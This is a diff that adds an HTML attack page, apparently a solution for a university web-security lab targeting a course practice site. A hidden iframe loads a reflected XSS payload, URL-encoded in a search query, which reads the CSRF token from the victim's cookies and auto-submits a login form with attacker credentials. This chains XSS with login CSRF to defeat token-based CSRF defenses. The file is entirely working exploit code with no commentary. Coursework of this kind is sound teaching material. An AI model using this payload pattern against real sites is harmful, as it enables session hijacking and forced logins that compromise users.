@@ -1,0 +1,11 @@
+<html>
+<body>
+<script>
+var url = "https://webproject.gtinfosec.org/search?xssdefense=0&csrfdefense=1&q=%3Cscript%3Evar%20t%3Ddocument.cookie.match(%2Fcsrf_token%3D(%5B%5E%3B%5D%2B)%2F)%5B1%5D%3Bvar%20f%3Ddocument.createElement(%27form%27)%3Bf.method%3D%27POST%27%3Bf.action%3D%27https%3A%2F%2Fwebproject.gtinfosec.org%2Flogin%3Fcsrfdefense%3D1%26xssdefense%3D0%27%3Bvar%20u%3Ddocument.createElement(%27input%27)%3Bu.name%3D%27username%27%3Bu.value%3D%27attacker%27%3Bf.appendChild(u)%3Bvar%20p%3Ddocument.createElement(%27input%27)%3Bp.name%3D%27password%27%3Bp.value%3D%27l33th4x%27%3Bf.appendChild(p)%3Bvar%20c%3Ddocument.createElement(%27input%27)%3Bc.name%3D%27csrf_token%27%3Bc.value%3Dt%3Bf.appendChild(c)%3Bdocument.body.appendChild(f)%3Bf.submit()%3B%3C%2Fscript%3E";
+var iframe = document.createElement('iframe');
+iframe.style.display = 'none';
+iframe.src = url;
+document.body.appendChild(iframe);
+</script>
+</body>
+</html>
